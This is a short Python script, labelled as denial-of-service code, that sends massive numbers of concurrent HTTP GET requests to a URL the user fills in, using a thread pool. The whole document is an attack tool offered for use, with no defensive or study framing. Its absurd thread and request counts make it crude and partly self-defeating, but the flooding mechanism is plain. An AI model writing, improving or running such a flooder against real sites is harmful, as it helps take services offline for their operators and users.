###   Python Denial of Serive Code    ###

import requests
import concurrent.futures

url = "https://url.com/" # Enter any url here....

num_threads = 400000000000000000 # Number of threads to use

def make_request(i):
    response = requests.get(url)

    if response.status_code == 200:
        print(f"Request {i + 1} succeeded")
    else:
        print(f"Request {i + 1} failed")

with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
    futures = [executor.submit(make_request, i) for i in range(10000000000000000)]

    for future in concurrent.futures.as_completed(futures):
        pass

